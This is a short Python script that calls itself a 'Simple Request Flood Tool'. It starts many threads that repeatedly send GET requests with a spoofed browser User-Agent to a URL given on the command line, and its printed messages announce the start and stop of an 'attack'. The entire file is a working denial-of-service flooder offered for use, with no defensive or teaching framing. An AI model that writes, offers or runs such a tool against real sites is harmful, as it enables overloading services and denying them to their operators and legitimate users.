import threading
import requests
import sys
import time

def attack(target_url, request_count):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    
    for i in range(request_count):
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
            print(f"[Thread {threading.current_thread().name}] Request {i+1}/{request_count} - Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[Thread {threading.current_thread().name}] Error: {str(e)}")
        time.sleep(0.1)  # Small delay to prevent overwhelming local machine

def main():
    print("Simple Request Flood Tool")
    print("-------------------------")
    
    if len(sys.argv) < 3:
        print("Usage: python script.py <target_url> <thread_count> <requests_per_thread>")
        print("Example: python script.py http://example.com 10 100")
        return
    
    target_url = sys.argv[1]
    thread_count = int(sys.argv[2])
    requests_per_thread = int(sys.argv[3])
    
    if not target_url.startswith(('http://', 'https://')):
        print("Error: URL must start with http:// or https://")
        return
    
    print(f"\nStarting attack on {target_url}")
    print(f"Threads: {thread_count}, Requests per thread: {requests_per_thread}")
    print("Press Ctrl+C to stop\n")
    
    threads = []
    
    try:
        for i in range(thread_count):
            t = threading.Thread(
                target=attack,
                args=(target_url, requests_per_thread),
                name=f"{i+1}"
            )
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
            
    except KeyboardInterrupt:
        print("\nStopping attack...")
        sys.exit(0)

if __name__ == "__main__":
    main()
